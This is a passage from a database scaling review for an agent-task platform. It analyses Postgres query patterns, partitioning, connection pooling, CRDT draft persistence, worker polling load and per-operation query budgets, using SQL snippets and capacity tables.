(already designed, must be implemented). Locality cache in Redis is
essential for poll performance.

#### 25.3.2 Hot Path Queries — Page Loads

**Workspace list with stats (lateral join pattern):**
```sql
SELECT w.*,
  COALESCE(j.cost_sum, 0) AS cost,
  COALESCE(t.total, 0) AS total_tasks,
  COALESCE(t.completed, 0) AS tasks_completed,
  COALESCE(t.active, 0) AS concurrent_tasks
FROM workspaces w
LEFT JOIN LATERAL (
  SELECT SUM(cost_usd) AS cost_sum FROM jobs WHERE workspace_id = w.id
) j ON TRUE
LEFT JOIN LATERAL (
  SELECT COUNT(*) AS total,
    COUNT(*) FILTER (WHERE status = 'completed') AS completed,
    COUNT(*) FILTER (WHERE status = 'running') AS active
  FROM tasks t2 JOIN jobs j2 ON t2.job_id = j2.id
  WHERE j2.workspace_id = w.id
) t ON TRUE
WHERE w.org_id = $1;
```

**Scaling concern:** The lateral join on `tasks` via `jobs` scans all
historical tasks for every workspace. At M2:
- 50,000 workspaces (but org-scoped, so ~50 per org)
- Each workspace may have 1,000+ historical tasks
- 50 workspaces × 1,000 tasks = 50,000 row scans per page load

**Optimization — Denormalize stats onto the workspace row:**

Add denormalized columns to `workspaces`:
```sql
ALTER TABLE workspaces ADD COLUMN
  cached_total_tasks     INT NOT NULL DEFAULT 0,
  cached_completed_tasks INT NOT NULL DEFAULT 0,
  cached_active_tasks    INT NOT NULL DEFAULT 0,
  cached_cost_usd        NUMERIC(10,4) NOT NULL DEFAULT 0,
  cached_stats_at        TIMESTAMPTZ;
```

Update these atomically on task completion/creation (same transaction as
the task status UPDATE). The workspace list query becomes:

```sql
SELECT * FROM workspaces WHERE org_id = $1 ORDER BY updated_at DESC;
```

Single index scan, **<2ms** regardless of scale.

**Alternative — Use the existing denormalized columns on `jobs`:**

The `jobs` table already has `total_tasks`, `completed_tasks`,
`failed_tasks`, `cost_usd`. The lateral join can sum `jobs` directly
(typically <20 jobs per workspace) rather than scanning individual tasks:

```sql
LEFT JOIN LATERAL (
  SELECT SUM(total_tasks) AS total, SUM(completed_tasks) AS completed,
    SUM(cost_usd) AS cost,
    SUM(CASE WHEN status = 'running' THEN 1 ELSE 0 END) AS active_jobs
  FROM jobs WHERE workspace_id = w.id
) j ON TRUE
```

This is already O(jobs per workspace) not O(tasks per workspace) — much
better. The existing denormalization on `jobs` is sufficient for M1–M2.

**Verdict:** ✅ The existing `jobs`-level denormalization handles the
workspace list query. No additional denormalization needed initially.

#### 25.3.3 CRDT Draft Persistence — Write Amplification

The draft system uses an append-only update log with periodic compaction:

```
Write path:  INSERT INTO draft_updates (session_id, update_data) — every 2–5s
Compaction:  merge updates → UPDATE draft_sessions.yjs_state — every 50 updates or 5 min
```

**Write volume analysis at M2 (500 concurrent drafts):**
- 500 drafts × 1 update every 3s = ~167 INSERTs/second to `draft_updates`
- Each INSERT is ~100B–2KB (Yjs delta) — small rows
- Compaction deletes ~50 rows and updates 1 row every 5 min per session
- 500 sessions / 5 min = ~1.7 compactions/second

**TOAST concern:** `draft_sessions.yjs_state` is a BYTEA column. Yjs
snapshots range from 10KB–10MB. Postgres TOAST compresses and stores
large values out-of-line. Each compaction UPDATE rewrites the TOAST
chunks. At 1.7 compactions/second with 500KB average snapshots:

- Write: 1.7 × 500KB = **~850 KB/s** of TOAST writes
- VACUUM pressure: dead TOAST tuples accumulate between autovacuum runs

This is modest for a modern SSD-backed Postgres. The design document
correctly chose the append-log pattern (§2.5) specifically to avoid
per-keystroke TOAST rewrites. The original design cites Hocuspocus as
precedent.

**Verdict:** ✅ Draft persistence pattern is well-designed. No changes
needed through M2. Beyond M2, consider moving compacted snapshots to
object storage (GCS/S3) with Postgres storing only a reference URL.

#### 25.3.4 Timeline Entries — Append-Heavy, Read-Paginated

Timeline entries are append-only during task execution and read with
cursor-based pagination:

```sql
-- Write (agent running, ~1–5 entries/second per active task)
INSERT INTO timeline_entries (task_id, entry_type, content, metadata)
VALUES ($1, $2, $3, $4);

-- Read (paginated, newest first)
SELECT * FROM timeline_entries
WHERE task_id = $1
ORDER BY created_at DESC
LIMIT 50 OFFSET 0;
```

**Volume at M2:**
- 1,000,000 entries/day = ~11.6 entries/second globally
- Uses `idx_timeline_task` (task_id, created_at DESC) — B-tree covers
  both filtering and ordering
- Reads are always task-scoped (single task_id = narrow index range scan)

**Long-term concern:** Over months, `timeline_entries` grows indefinitely.
At 1M/day, after 1 year = 365M rows. The index stays efficient for
individual task lookups, but `VACUUM` and `pg_stat` overhead increases.

**Recommendation:** Partition by `created_at` (monthly range partitions)
when approaching 100M rows. This is already noted in Open Question #6
of API_AND_STORAGE.md. Partition pruning makes per-task queries hit only
the relevant month's partition.

```sql
CREATE TABLE timeline_entries (
  ...
) PARTITION BY RANGE (created_at);

CREATE TABLE timeline_entries_2026_01 PARTITION OF timeline_entries
  FOR VALUES FROM ('2026-01-01') TO ('2026-02-01');
-- etc.
```

**No code change required** — sqlx queries against the parent table; the
planner routes to the correct partition automatically.

**Verdict:** ✅ for M0–M1. Partition at M2. The design already
anticipated this.

#### 25.3.5 Search — FTS + pgvector Hybrid

The search design uses two Postgres features:

1. **tsvector + GIN** for keyword search
2. **pgvector HNSW** for semantic similarity

**Query pattern:**
```sql
-- FTS leg
SELECT ... FROM search_documents sd
WHERE sd.fts @@ websearch_to_tsquery('english', $1)
ORDER BY ts_rank_cd(sd.fts, ...) DESC LIMIT 20;

-- Semantic leg
SELECT ... FROM search_documents sd
WHERE sd.embedding IS NOT NULL
ORDER BY sd.embedding <=> $query_vector LIMIT 20;
```

**Scaling analysis:**

| Scale | Documents | FTS GIN index size | HNSW index size | Query time |
|-------|-----------|-------------------|-----------------|-----------|
| M0 | 10,000 | ~10 MB | ~30 MB | <20 ms |
| M1 | 500,000 | ~500 MB | ~1.5 GB | <50 ms |
| M2 | 10,000,000 | ~10 GB | ~30 GB | ~100–200 ms |

**HNSW concerns at M2:**
- 10M documents × 1536-dimension float32 vectors = ~60 GB raw vector data
- HNSW index with `m=16, ef_construction=64` ≈ 30 GB additional
- Total: **~90 GB** for the vector index alone
- This fits in a 128 GB Postgres instance but pushes memory limits
- HNSW search at 10M documents: ~100ms with `ef_search=40`

**The search queries are already workspace-scoped** (join on
`workspace_branches`), which dramatically reduces the effective search
space. A workspace typically has 500–5,000 documents, not 10M. The
`idx_search_branch` index on `workspace_branch_id` prunes the scan before
the HNSW/GIN indexes are consulted.

**Optimization — Partition search_documents by workspace_branch_id:**

At M2, partitioning `search_documents` per workspace branch would keep each
HNSW index small (~5,000 rows) and each search under 10ms. However, this
creates thousands of partitions (one per workspace branch), which has its
own overhead in Postgres.

**Better approach — Partial HNSW indexes per org:**

pgvector supports WHERE-clause partial indexes:
```sql
CREATE INDEX idx_search_embedding_org ON search_documents
USING hnsw (embedding vector_cosine_ops)
WHERE workspace_branch_id IN (
  SELECT id FROM workspace_branches WHERE workspace_id IN (
    SELECT id FROM workspaces WHERE org_id = :org_id
  )
);
```

This is fragile. The practical answer is: **search stays fast if queries
are workspace-scoped**, which they always are (the API requires
`:workspaceId` in the search path). At M2, even without partitioning,
a workspace-filtered HNSW scan over 5,000 documents is <10ms.

**Verdict:** ✅ for M0–M2 with workspace-scoped queries. If cross-org
global search becomes a requirement, consider a dedicated vector store
(Qdrant, Pinecone) or Postgres partitioning by org.

#### 25.3.6 Usage Records — High-Volume Billing Table

The `usage_records` table receives one row per LLM API call. With agents
making 10–50 LLM calls per task:

| Scale | Tasks/day | LLM calls/day | Rows/day |
|-------|-----------|---------------|----------|
| M0 | 200 | 4,000 | 4,000 |
| M1 | 5,000 | 100,000 | 100,000 |
| M2 | 100,000 | 2,000,000 | 2,000,000 |

At M2, `usage_records` grows by 2M rows/day = **730M rows/year**.

**Read patterns:** Billing dashboards use GROUP BY aggregations:
```sql
SELECT provider, model, DATE_TRUNC('day', created_at) AS day,
  SUM(cost_usd), SUM(input_tokens), SUM(output_tokens)
FROM usage_records
WHERE org_id = $1 AND created_at >= $2
GROUP BY provider, model, day;
```

Covered by `idx_usage_org_time` + `idx_usage_provider_model`.

**Recommendation:** Partition by `created_at` (monthly) at M1+. Old
partitions (>6 months) can be moved to cheaper storage or summarized
into a `usage_summaries` rollup table.

```sql
-- Rollup table (populated by monthly batch job)
CREATE TABLE usage_summaries (
  org_id UUID, workspace_id UUID, provider TEXT, model TEXT,
  period_start DATE, period_end DATE,
  total_cost_usd NUMERIC, total_input_tokens BIGINT,
  total_output_tokens BIGINT, call_count INT,
  PRIMARY KEY (org_id, workspace_id, period_start, provider, model)
);
```

**Verdict:** ⚠️ Requires partitioning at M1 and rollup tables at M2.
Without these, billing queries over 730M rows will degrade. The schema
is otherwise correct.

---

### 25.4 Connection Pool Sizing

The current configuration:

```rust
// g5-api/src/config.rs
database_max_connections: 20    // per g5-api instance
database_min_connections: 5
```

**Analysis by deployment scale:**

| Scale | g5-api instances | Pool per instance | Total PG connections | Postgres limit |
|-------|-----------------|-------------------|---------------------|---------------|
| M0 | 1 | 20 | 20 | 100 (default) |
| M1 | 3 | 20 | 60 | 100 |
| M2 | 10 | 20 | 200 | 200 (tuned) |

**Risks:**
- **M1:** 60 connections is safe but leaves little room for maintenance
  connections (`psql`, migrations, `pg_stat_*`). Bump `max_connections`
  to 150 in Postgres config.
- **M2:** 200 connections is at the limit. Postgres performance degrades
  past ~200 connections due to process-per-connection overhead. Solutions:
  - **PgBouncer in transaction pooling mode** — multiplexes N app connections
    over M Postgres connections (N >> M). Standard practice at scale.
  - Reduce per-instance pool to 10 and add PgBouncer with 50
    server-side connections serving 200 client-side connections.

**Worker connections:** Workers call `/api/internal/` endpoints (REST),
which use the g5-api pool — not direct Postgres connections. Workers never
connect to Postgres directly. This is correct — the API is the choke point,
not the workers.

**Verdict:** ✅ for M0–M1. ⚠️ At M2, must add PgBouncer. This is standard
infrastructure, not a design flaw.

---

### 25.5 CRDT Document Store — Memory and Flush Strategy

The `DocumentStore` holds active Yjs documents in memory:

```
Load path:  DB → draft_sessions.yjs_state + replay draft_updates → in-memory Y.Doc
Edit path:  WS binary → Y.applyUpdate(doc) → in-memory
Persist:    debounce 100ms → INSERT draft_updates
Flush:      60s idle → merge all → UPDATE draft_sessions.yjs_state → drop from memory
```

**Concurrent document capacity:**

| Metric | Value | Notes |
|--------|-------|-------|
| In-memory docs (targets) | 500 at M2 | Grace period = 60s idle |
| Avg document size in memory | 200 KB – 2 MB | Yjs Doc with history |
| Peak memory for CRDT store | 1 GB | 500 × 2 MB worst case |
| Persist writes/second | ~167 | 500 docs × 1 update/3s |
| Flush writes/second | ~1.7 | 500 docs / (5 min compaction) |

**Multi-instance CRDT coordination:**

If g5-api is horizontally scaled, two instances might serve the same
draft. The current design has a single `CrdtAuthority` per instance.
At M2 with 10 instances, drafts must be **pinned to a single instance**
(sticky sessions on the CRDT WebSocket) or use a shared Yjs server
process.

**Recommendation:** Use consistent hashing on `(workspace_id, branch)` to
route CRDT WebSocket connections to a specific g5-api instance. This
avoids split-brain Yjs documents. The main event WebSocket (non-CRDT)
can round-robin freely since it uses Redis pub/sub for fan-out.

**Verdict:** ⚠️ CRDT connections need sticky routing at multi-instance
scale (M1+). This is a deployment concern, not a code bug — add
sticky session routing in the load balancer (e.g., Caddy/Nginx hash
on the `workspace_id:branch` pair from the WebSocket URL).

---

### 25.6 Worker Poll Storm — Thundering Herd

Workers poll with `POST /api/internal/workers/:id/poll` every 2–5 seconds
when idle. At M2 with 2,000 workers:

- Idle poll rate: 2,000 × (1/3.5s avg) = **~571 poll requests/second**
- Each poll runs the locality scoring query against the ready-task set

**If ready-task set is in Redis** (as designed):
- Redis lookup: O(1) per ready task, ~0.1ms per poll
- Total: 571 × 0.1ms = **~57ms/s Redis time** — negligible

**If not in Redis (Postgres-only):**
- Each poll runs the `NOT EXISTS` dependency check on `tasks`
- 571 polls/s × 50ms each = **~28.5 seconds of Postgres time per second**
- This would **saturate the connection pool** — the system cannot function

**Verdict:** ❌ Without the Redis ready-task cache, worker polling at
M2 is catastrophic. The design correctly specifies Redis materialization.
**Implementation is mandatory before scaling past M0.**

The design also mentions Redis pub/sub hints to wake idle workers
immediately when tasks become available. This reduces idle polling to
near-zero: workers only poll after a hint, not on a timer. With hints,
the poll rate drops from 571/s to ~10–50/s (matching task creation rate).

---

### 25.7 Clone Operation — Transactional Heaviness

`POST /api/v1/workspaces/:id/clone` copies:
1. Workspace row
2. Workspace branches (N repos)
3. All ontology_nodes (up to 500+)
4. node_dependencies (up to 500+)
5. draft_sessions + draft_updates (BYTEA blobs)
6. Docs + doc_node_links

This runs in a **single transaction** (all-or-nothing), which means:
- Long-lived transaction holding row-level locks on source rows
- Large BYTEA copy for draft_sessions.yjs_state
- Many INSERTs (500+ ontology nodes) with FK constraint checks

**Estimated duration:**
- 500 ontology nodes × ~0.1ms INSERT each = 50ms
- 500 node_dependencies × ~0.05ms = 25ms
- 3 draft sessions × ~5ms (BYTEA copy 100KB) = 15ms
- FK constraint checks: ~20ms
- Total: **~110ms** per clone

This is fast enough at M0–M1. At M2, if clones become frequent (e.g.,
automated branching), the long transaction could contend with concurrent
reads on `ontology_nodes`.

**Verdict:** ✅ for M0–M2 at expected clone frequency (~10 clones/day).
If clone becomes a hot path (>100/day), consider breaking it into
multiple transactions with cleanup on failure (saga pattern).

---

### 25.8 Index and VACUUM Pressure Summary

| Table | Rows at M2/yr | Index count | Write pattern | VACUUM risk |
|-------|---------------|-------------|---------------|------------|
| `timeline_entries` | 365M | 1 (task_id, created_at) | Append-only | ⚠️ High — partition by month |
| `usage_records` | 730M | 5 | Append-only | ⚠️ High — partition by month |
| `chat_messages` | 73M | 2 + GIN(fts) | Append-only | ⚠️ Moderate — partition by month |
| `draft_updates` | Low (compacted) | 1 (session_id, seq) | Append + DELETE | ✅ Low — rows are short-lived |
| `ontology_nodes` | 5M | 2 | Moderate updates | ✅ OK — clustered updates per workspace |
| `tasks` | 36.5M | 3 (incl. partial) | Insert + status update | ⚠️ Moderate — status updates generate dead tuples |
| `jobs` | 1.8M | 3 (incl. partial) | Insert + denorm updates | ✅ OK |
| `search_documents` | 10M | 3 (GIN + HNSW) | Bulk upsert on index | ⚠️ HNSW rebuild cost |
| `comment_index` | 2M | 4 (incl. partial) | Insert + resolve update | ✅ OK |

**Recommendations:**
1. **Partition** `timeline_entries`, `usage_records`, and `chat_messages` by
   `created_at` at M1 (monthly ranges).
2. Tune `autovacuum_vacuum_scale_factor = 0.01` (down from default 0.2) for
   `tasks` and `search_documents` to keep dead tuple ratio low.
3. Schedule `VACUUM ANALYZE` on `search_documents` after bulk re-indexing
   operations (post-commit, post-job-completion).

---

### 25.9 Summary — What Works, What Needs Work

#### ✅ Design Decisions That Scale Well

1. **Separation of concerns**: Git for content, Postgres for metadata,
   Redis for ephemeral state. Each system does what it's best at.

2. **CRDT append-log persistence**: The `draft_updates` append pattern
   (inspired by Hocuspocus) avoids TOAST write amplification. Compaction
   bounds the replay window.

3. **EventBus with Redis pub/sub**: Multi-instance WebSocket fan-out
   via Redis is the standard approach. Channel-scoped subscriptions
   prevent broadcast storms.

4. **Denormalized counters on `jobs`**: `total_tasks`, `completed_tasks`,
   `cost_usd` on the `jobs` table eliminates the need to scan `tasks`
   for dashboard stats.

5. **Workspace-scoped search**: All search queries filter by
   `workspace_branch_id`, keeping the effective search space small
   regardless of global document count.

6. **Pull-model worker scheduling**: Workers poll for tasks rather than
   being pushed assignments. This naturally handles back-pressure and
   removes coordinator complexity.

7. **CAS-guarded draft commits**: The `expectedHeadCommit` + `FOR UPDATE`
   pattern prevents lost updates without pessimistic locking.

8. **Partial indexes on status columns**: `idx_task_pending`, `idx_job_scheduling`,
   etc. keep index sizes proportional to active work, not historical volume.

#### ⚠️ Required Optimizations (by milestone)

| # | Optimization | When | Effort | Impact |
|---|-------------|------|--------|--------|
| 1 | **Redis ready-task materialization** | M0 (before any multi-worker deployment) | Medium | Critical — scheduler and worker poll won't function at scale without it |
| 2 | **Sticky CRDT WebSocket routing** | M1 (before multi-instance g5-api) | Low | Required — split-brain Yjs documents cause data loss |
| 3 | **Partition timeline_entries** | M1 (at ~50M rows) | Low | VACUUM performance + query speed on old tasks |
| 4 | **Partition usage_records** | M1 (at ~50M rows) | Low | Billing query performance + storage management |
| 5 | **PgBouncer** | M2 (past 100 Postgres connections) | Low | Connection multiplexing — standard infrastructure |
| 6 | **Ontology lazy loading** | M2 (workspaces >500 nodes) | Medium | Page load payload size; already designed in FRONTEND_DESIGN.md |
| 7 | **Usage rollup tables** | M2 (past 100M usage_records) | Medium | Long-range billing analytics |
| 8 | **Partition chat_messages** | M2 (past 50M rows) | Low | Search and VACUUM performance |
| 9 | **Redis pub/sub for worker wake hints** | M0–M1 (reduces idle polling 10×) | Low | Reduces poll query load from 571/s to ~50/s |

#### ❌ No Architectural Redesign Needed

The core Postgres schema, REST API surface, WebSocket multiplexing, and
CRDT persistence strategy are **sound for the design targets** (M0–M2).
The identified optimizations are standard operational practices (partitioning,
connection pooling, Redis cache layers) — none require fundamental
schema or API changes.

The biggest risk is **not implementing the Redis ready-task cache** before
deploying workers in production. Without it, the scheduler degenerates to
O(tasks × deps) per tick, which is untenable past ~100 concurrent tasks.
This should be treated as a P0 pre-launch requirement.

---

### 25.10 Postgres Configuration Recommendations by Scale

```
# M0 (single instance, 20 connections)
max_connections = 100
shared_buffers = 1GB
effective_cache_size = 3GB
work_mem = 16MB
maintenance_work_mem = 256MB
random_page_cost = 1.1              # SSD
checkpoint_completion_target = 0.9
wal_buffers = 64MB
autovacuum_vacuum_scale_factor = 0.1

# M1 (3 instances, 60 connections) — same as M0 but:
max_connections = 150

# M2 (10 instances behind PgBouncer) — PgBouncer config:
# [pgbouncer]
# pool_mode = transaction
# default_pool_size = 50
# max_client_conn = 500
# server_idle_timeout = 300
#
# Postgres:
max_connections = 80                # PgBouncer manages the rest
shared_buffers = 4GB
effective_cache_size = 12GB
work_mem = 32MB
maintenance_work_mem = 1GB
```

---

### 25.11 Per-Operation Query Budget — Exact Counts

_Date: 2026-02-21_

To answer the question "how much Postgres pressure does one user / one job
create?", we traced every `sqlx::query*` call in the service layer and the
worker daemon to build exact query budgets per operation.

#### Methodology

- Counted every `sqlx::query`, `sqlx::query_as`, `sqlx::query_scalar` call
  per public service method.
- g5d (worker daemon) makes **zero direct Postgres queries** — all DB
  access flows through HTTP calls to g5-api's internal endpoints.
- WebSocket channel subscriptions trigger 1–3 authorization SELECTs each
  (channel type resolution + org membership + workspace membership).

---

#### 25.11.1 Per Service Method — Read vs Write Counts

```
┌─────────────────────────────────────────────────────────────────────┐
│  SERVICE METHOD                   │ READS │ WRITES │ TX? │ NOTES   │
├───────────────────────────────────┼───────┼────────┼─────┼─────────┤
│ WORKSPACE                        │       │        │     │         │
│  list_workspaces                  │   4   │   0    │  N  │ count + rows + branches + deps │
│  get_workspace                    │   3   │   0    │  N  │ row + branches + deps │
│  create_workspace                 │   1   │  N+M+3 │  Y  │ N branches, M deps │
│                                   │       │        │     │         │
│ ONTOLOGY                          │       │        │     │         │
│  get_ontology_tree                │   2   │   0    │  N  │ existence + full forest │
│  get_node                         │   1   │   0    │  N  │ node with joins │
│  get_node_children                │   2   │   0    │  N  │ exists + children │
│  get_node_dependencies            │   3   │   0    │  N  │ exists + deps + dependents │
│  create_node                      │  3-4  │   1    │  Y  │ validates + INSERT │
│                                   │       │        │     │         │
│ JOBS                              │       │        │     │         │
│  list_jobs                        │   2   │   0    │  N  │ count + paginated rows │
│  get_job                          │   1   │   0    │  N  │ single with joins │
│  create_job                       │  2-4  │   2    │  Y  │ validates + INSERT job + task │
│  submit_task_graph                │   1   │  N+1   │  Y  │ N tasks + UPDATE job │
│  cancel_job                       │   1   │  2+    │  Y  │ cascade status UPDATEs │
│                                   │       │        │     │         │
│ TASKS                             │       │        │     │         │
│  poll_for_task                    │  4-7  │  1-2   │  Y  │ ★ HOTTEST — claim + hydrate │
│  worker_heartbeat                 │   0   │   1    │  N  │ single UPDATE │
│  transition_task                  │  2-5  │  2-5   │  Y  │ ★ MOST VARIABLE │
│  append_timeline                  │   1   │   1    │  N  │ validate + INSERT │
│  create_checkpoint                │   1   │   1    │  N  │ validate + INSERT │
│  register_worker                  │  0-1  │   1    │  N  │ optional org lookup + INSERT │
│  terminate_worker                 │   0   │   2    │  Y  │ UPDATE worker + tasks │
│                                   │       │        │     │         │
│ DRAFTS                            │       │        │     │         │
│  list_drafts                      │   1   │   0    │  N  │ with joins │
│  get_draft                        │   1   │   0    │  N  │ with participant count │
│  create_draft                     │   3   │   1    │  N  │ validate branch + existing + INSERT │
│  commit_draft                     │  4-5  │  3-4   │  Y  │ ★ HEAVIEST user op — CAS guard │
│  discard_draft                    │   1   │   3    │  Y  │ UPDATE + 2× DELETE │
│                                   │       │        │     │         │
│ CHAT                              │       │        │     │         │
│  list_sessions                    │   2   │   0    │  N  │ data + count │
│  get_session                      │   1   │   0    │  N  │ with joins │
│  create_session                   │   1   │   1    │  N  │ INSERT + get_session │
│  send_message                     │   2   │  3-4   │  Y  │ session + max_index + INSERTs + UPDATEs │
│  get_messages                     │   2   │   0    │  N  │ exists + messages │
│  fork_session                     │   1   │   3    │  Y  │ deep copy │
│                                   │       │        │     │         │
│ COMMENTS                          │       │        │     │         │
│  list_comments                    │   1   │   0    │  N  │ with reply_count subquery │
│  create_comment                   │  1-2  │   1    │  N  │ conditionally validates context │
│  add_reply                        │   1   │   2    │  N  │ INSERT + UPDATE parent ts │
│                                   │       │        │     │         │
│ SEARCH                            │       │        │     │         │
│  search                           │  3+N  │   0    │  N  │ settings + FTS + semantic + N breadcrumbs │
│  reindex_workspace_branch         │  2    │  N+1   │  N  │ hashes + files + N UPSERTs + DELETE stale │
│                                   │       │        │     │         │
│ NOTIFICATIONS                     │       │        │     │         │
│  list_notifications               │   1   │   0    │  N  │ paginated │
│  mark_read                        │   0   │   1    │  N  │ UPDATE │
│  create_notification              │   0   │   1    │  N  │ INSERT CTE │
│                                   │       │        │     │         │
│ SPEND                             │       │        │     │         │
│  check_spend_limit                │  1-2  │   0    │  N  │ settings + conditional totals │
│  record_usage                     │   0   │ B×1-4  │  Y  │ B records × (INSERT + counter UPDATEs) │
│  get_spend_summary                │   4   │   0    │  N  │ exists + settings + totals + breakdown │
│                                   │       │        │     │         │
│ WS CHANNEL AUTH                   │       │        │     │         │
│  subscribe (per channel)          │  1-3  │   0    │  N  │ resolve + membership check │
└─────────────────────────────────────────────────────────────────────┘
```

---

#### 25.11.2 Active User Session — Query Load Profile

An "active user" is a developer with a workspace page open, clicking
through the ontology tree, monitoring jobs, and occasionally chatting.

**Phase 1 — Page Load (one-time burst)**

| API call | Reads | Writes |
|----------|:-----:|:------:|
| `GET /workspaces/:id` | 3 | 0 |
| `GET /workspaces/:id/ontology` | 2 | 0 |
| `GET /workspaces/:id/jobs` | 2 | 0 |
| `GET /sessions?workspace=:id` | 2 | 0 |
| `GET /workspaces/:id/drafts` | 1 | 0 |
| `GET /notifications` | 1 | 0 |
| `GET /workspaces/:id/workers` | 1 | 0 |
| WS connect + 3 channel subscribes | 6 | 0 |
| **Page load total** | **18** | **0** |

Time to serve (indexed, warm cache): **~15–25ms** total Postgres time.

**Phase 2 — Steady-State Interaction (per minute)**

| Action | Frequency/min | Reads/action | Writes/action | Reads/min | Writes/min |
|--------|:------------:|:------------:|:-------------:|:---------:|:----------:|
| Click ontology node | 3 | 4 | 0 | 12 | 0 |
| Browse jobs/tasks | 1 | 2 | 0 | 2 | 0 |
| Send chat message | 0.5 | 2 | 4 | 1 | 2 |
| Search | 0.3 | 4 | 0 | 1.2 | 0 |
| View comments | 0.5 | 1 | 0 | 0.5 | 0 |
| Create comment | 0.1 | 2 | 1 | 0.2 | 0.1 |
| **Steady-state total** | — | — | — | **~17** | **~2** |

**Active user steady-state: ~19 queries/minute (~0.3 queries/second)**

This is extremely low. A single Postgres connection can sustain
~1,000 simple queries/second. One active user consumes **0.03%** of
one connection's capacity.

**Phase 3 — CRDT Editing (when user is editing specs)**

| Operation | Frequency | Reads | Writes | Queries/min |
|-----------|:---------:|:-----:|:------:|:-----------:|
| CRDT WS subscribe | once | 2 | 0 | 0 (one-time) |
| `INSERT draft_updates` | 12–30/min | 0 | 1 | 12–30 writes |
| Compaction (every 5 min) | 0.2/min | 1 | 2 | 0.6 |
| **CRDT editing total** | — | — | — | **~13–31 writes/min** |

An actively-editing user adds ~30 writes/min. Still very manageable.

---

#### 25.11.3 Active Job — Query Load Profile

A "job" is a complete lifecycle: creation → bootstrap task → N regular
tasks → completion. Each task involves the agent making tool calls (which
are HTTP→SQL) and the worker polling for work.

**Job Creation (one-time)**

| Operation | Reads | Writes |
|-----------|:-----:|:------:|
| `create_job` | 4 | 2 |
| `submit_task_graph` (5 tasks) | 1 | 6 |
| **Job creation total** | **5** | **8** |

**Per Task Execution (the heavy part)**

This is the core loop: worker claims task → agent runs ReAct loop →
agent calls tools → agent reports usage → task transitions to terminal.

For a typical task with 10 agent turns, 10 LLM calls, 5 tool calls
that hit timeline/checkpoint endpoints, and 1 usage batch:

| Operation | Count | Reads | Writes | Total R | Total W |
|-----------|:-----:|:-----:|:------:|:-------:|:-------:|
| Worker poll (claim) | 1 | 6 | 2 | 6 | 2 |
| Heartbeats (30s intervals, ~5min task) | 10 | 0 | 1 | 0 | 10 |
| `append_timeline` | 10 | 1 | 1 | 10 | 10 |
| `create_checkpoint` | 1 | 1 | 1 | 1 | 1 |
| `check_spend_limit` (per LLM call) | 10 | 2 | 0 | 20 | 0 |
| `record_usage` (batch of 10) | 1 | 0 | 20 | 0 | 20 |
| `transition_task` (terminal) | 1 | 4 | 4 | 4 | 4 |
| **Per-task total** | — | — | — | **41** | **47** |

**Full Job (5 tasks + bootstrap)**

| Phase | Reads | Writes |
|-------|:-----:|:------:|
| Job creation | 5 | 8 |
| Bootstrap task | 41 | 47 |
| Regular tasks × 5 | 205 | 235 |
| Worker idle polls (between tasks, ~3 polls at 2 reads each) | 6 | 0 |
| **Full job total** | **~257** | **~290** |

**Total: ~547 queries per job over ~30 minutes = ~0.3 queries/second**

This is remarkably low per job. The queries are bursty (clustered during
task claim and transition) rather than sustained.

**Per-Minute Breakdown During Active Task Execution:**

| Source | Reads/min | Writes/min |
|--------|:---------:|:----------:|
| `append_timeline` (2/min) | 2 | 2 |
| `check_spend_limit` (2 LLM calls/min) | 4 | 0 |
| Heartbeat | 2 | 2 |
| Burst: poll + transition (amortized) | 2 | 1.5 |
| **Per-task-minute total** | **~10** | **~5.5** |

**Active task: ~15.5 queries/minute (~0.26 queries/second)**

---

#### 25.11.4 Worker Idle Polling — The Background Tax

Workers that are idle (no task available) poll every 3–5 seconds (with
exponential backoff after 10 empty polls, up to 30s max).

| Phase | Poll interval | Queries/poll | Queries/min |
|-------|:------------:|:------------:|:-----------:|
| Initial (first 10 polls) | 3s | 2 | 40 |
| Backed-off (after 10 empty) | up to 30s | 2 | 4 |
| Heartbeat (always) | 30s | 1 | 2 |

**Idle worker steady-state: ~6 queries/min (~0.1 queries/sec)**

This is the "tax" for each registered worker. At 20 idle workers backed
off: 20 × 6 = **120 queries/min** — negligible.

At 200 idle workers: 200 × 6 = **1,200 queries/min** (~20/sec) — still
well within budget but starting to show on `pg_stat_statements`.

---

#### 25.11.5 Single-Instance Capacity Estimate

**Hardware assumption:** Single g5-api instance with `max_connections=20`
on a 4-core, 16 GB Postgres instance using SSDs.

**Postgres throughput baseline:**

| Query type | Latency (p50) | Throughput per connection |
|------------|:------------:|:------------------------:|
| Simple SELECT by PK/index | 0.1–0.5 ms | ~2,000–10,000/s |
| JOIN of 2-3 tables (indexed) | 0.5–2 ms | ~500–2,000/s |
| INSERT (single row) | 0.3–1 ms | ~1,000–3,000/s |
| UPDATE + index maintenance | 0.5–2 ms | ~500–2,000/s |
| Complex lateral join | 2–10 ms | ~100–500/s |
| FOR UPDATE SKIP LOCKED claim | 0.5–2 ms | ~500–2,000/s |

Conservative estimate for mixed workload: **~1,000 queries/sec/connection**

With 20 connections (minus 2 reserved for admin/migrations):
**~18,000 queries/second total capacity**

**Load model — what fits in 18,000 q/s:**

| Component | Count | Queries/sec | % of capacity |
|-----------|:-----:|:-----------:|:-------------:|
| Active users (page loads + interactions) | 50 | 50 × 0.3 = 15 | 0.08% |
| Active CRDT editors | 10 | 10 × 0.5 = 5 | 0.03% |
| Active tasks (executing) | 10 | 10 × 0.26 = 2.6 | 0.01% |
| Idle workers (backed off) | 20 | 20 × 0.1 = 2 | 0.01% |
| Page load bursts (2 users/min opening workspaces) | 2/min | 2 × 18 / 60 = 0.6 | <0.01% |
| WS channel subscribes (amortized) | — | ~1 | <0.01% |
| **Total M0** | — | **~26** | **0.14%** |

**At M0 load, Postgres utilization is < 1%.** The system is massively
over-provisioned.

**Scaling to capacity — how many users/jobs before pressure:**

```
Target: 50% capacity = 9,000 queries/sec

Active users:     9,000 / 0.3 = 30,000 concurrent users   (reads dominate)
Active tasks:     9,000 / 0.26 = 34,600 concurrent tasks   (writes dominate)
Idle workers:     9,000 / 0.1 = 90,000 idle workers         (trivial queries)
```

These numbers assume each load type in isolation. In practice, a blended
scenario:

| Scenario | Active users | Active tasks | Idle workers | Estimated q/s | % capacity |
|----------|:----------:|:----------:|:----------:|:------------:|:----------:|
| **Comfortable** | 200 | 50 | 50 | ~78 | 0.4% |
| **Medium** | 500 | 200 | 100 | ~212 | 1.2% |
| **Heavy** | 1,000 | 500 | 200 | ~473 | 2.6% |
| **Stress** | 2,000 | 1,000 | 500 | ~920 | 5.1% |
| **Headroom limit** | 5,000 | 2,000 | 1,000 | ~2,120 | 11.8% |

**A single g5-api instance with 20 Postgres connections can comfortably
support ~2,000 active users + 1,000 concurrent tasks + 500 workers at
